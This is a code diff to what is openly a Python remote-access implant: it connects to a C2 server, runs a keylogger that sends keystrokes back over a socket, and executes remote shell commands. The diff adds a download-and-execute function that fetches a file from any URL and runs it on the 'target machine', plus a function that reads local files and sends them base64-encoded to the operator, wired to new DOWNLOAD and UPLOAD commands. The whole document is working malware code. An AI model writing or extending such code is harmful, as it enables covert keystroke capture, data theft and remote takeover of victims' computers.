@@ -12,6 +12,7 @@ import threading
 import subprocess
 import base64
 import pynput
+import urllib.request
 from pynput import keyboard
 
 # If the free version of ngrok is used, the port will change each time ngrok is activated
@@ -20,7 +21,7 @@ port = 18642 # port
 glbSock = None # Stores the sock 
 
 keyBuffer = "" # String to store keystrokes for keylogging
-loggerIsRunning = False # Stores whether the keylogger is working
+loggerIsRunning = False # Stores whether the keylogger is working (will be used to stop the keylogger)
 
 
 # Handles the connection of the client to the C2 server through the socket library and tcp server. 
@@ -61,6 +62,9 @@ def send_beacon(sock):
 # Handles AttributeError by writing "SP: "
 # This function is called to store the keystrokes in a string, then sends it back to the user every 100
 # characters. After sending, the keyBuffer is cleared for the next 100 characters.
+# Preconditions: Valid key input, pynput library correctly imported
+# Postconditions: Keystrokes are stored in a string and sent back to the user every 100 characters, 
+# keyBuffer is cleared after sending.
 def on_press(key):
     global keyBuffer, glbSock, loggerIsRunning
     
@@ -82,7 +86,9 @@ def on_press(key):
       except:
         keyBuffer = ""
 
-# Activates the keylogger while storing the sock as global sock. 
+# Activates the keylogger while storing the sock as global sock and updating the logger status. 
+# Preconditions: Valid socket, pynput library correctly imported
+# Postconditions: Keylogger is activated and keystrokes are sent back to the user
 def start_keylogger(sock):
   #updates sock again before using on_press && loggerIsRunning is set to True
   global glbSock, loggerIsRunning
@@ -139,6 +145,72 @@ def execute_command(command, sock):
 ### File download and upload functions
 ###
 
+# Downloads a file from the specified URL and executes it on the target machine. 
+# Preconditions: Valid URL and socket is inputted from command_handler, and the URL is accessible and points to a valid file
+# Postconditions: The file is downloaded and executed on the target machine, output or equivalent is sent back
+def download_execute(full_cmd, sock):
+  try:
+    # Split command to check for -e flag
+    parts = full_cmd.split()
+    url = parts[0]
+    execute_after = "-e" in parts   # Check if -e flag is present
+
+    print(f"[*] Downloading file from: {url}")
+
+    # Extract filename from URL
+    filename = url.split('/')[-1].split('?')[0] if '/' in url else "downloaded_file.exe"
+    file_path = os.path.join(os.getcwd(), filename)
+
+    # Download the file
+    urllib.request.urlretrieve(url, file_path)
+    print(f"[+] Downloaded: {file_path}")
+
+    sock.send(f"FILE_OK|Downloaded: {filename}".encode("utf-8"))
+
+    # Auto-execute only if -e flag was given
+    if execute_after:
+      try:
+        subprocess.Popen(file_path, shell=True)
+        print(f"[+] Executed: {file_path}")
+        sock.send(f"EXEC_OK|File executed: {filename}".encode("utf-8"))
+      except Exception as exec_err:
+        print(f"[!] Execution failed: {exec_err}")
+        sock.send(f"EXEC_ERR|{str(exec_err)}".encode("utf-8"))
+    else:
+      print(f"[*] File saved but not executed (use -e to execute)")
+
+  except Exception as e:
+    error_msg = f"Download failed: {str(e)}"
+    print(f"[!] {error_msg}")
+    sock.send(f"FILE_ERR|{error_msg}".encode("utf-8"))
+
+# Uploads a file from the target machine to the client's machine.
+# Preconditions: Valid filename and socket is inputted from command_handler, and the file exists on the target machine
+# Postconditions: The file is uploaded to the client's machine, output or equivalent is sent back to the user
+def upload_file(filename, sock):
+  try:
+    full_path = os.path.join(os.getcwd(), filename)
+    
+    if not os.path.exists(full_path):
+      sock.send(f"UPLOAD_ERR|File not found: {filename}".encode("utf-8"))
+      print(f"[!] File not found: {full_path}")
+      return
+
+    print(f"[*] Uploading: {full_path}")
+
+    with open(full_path, "rb") as f:
+      file_data = f.read()
+
+    encoded = base64.b64encode(file_data).decode("utf-8")
+    sock.send(f"UPLOAD_DATA|{filename}|{len(file_data)}|{encoded}".encode("utf-8"))
+    
+    print(f"[+] Uploaded: {filename} ({len(file_data)} bytes)")
+
+  except Exception as e:
+    error_msg = f"Upload failed: {str(e)}"
+    print(f"[!] {error_msg}")
+    sock.send(f"UPLOAD_ERR|{error_msg}".encode("utf-8"))
+
 
 
 ###
@@ -173,8 +245,22 @@ def command_handler(sock):
         loggerIsRunning = False
         sock.send(b"KEYLOG| STOPPED")
 
-      #Other functions to be implemented
-      
+      #Downloading and executing a file (-e) from a specified URL command
+      elif cmd.startswith("DOWNLOAD:"):
+        url = cmd[9:].strip()
+        if url:
+          download_execute(url, sock)
+        else:
+          sock.send(b"CMD_ERR| No URL provided for download and execute")
+
+      # Uploading a file from the target machine to the client's machine command
+      elif cmd.startswith("UPLOAD:"):
+        filename = cmd[7:].strip()
+        if filename:
+          upload_file(filename, sock)
+        else:
+          sock.send(b"CMD_ERR| No filename provided for upload")
+
 
       # Shell Command
       else:
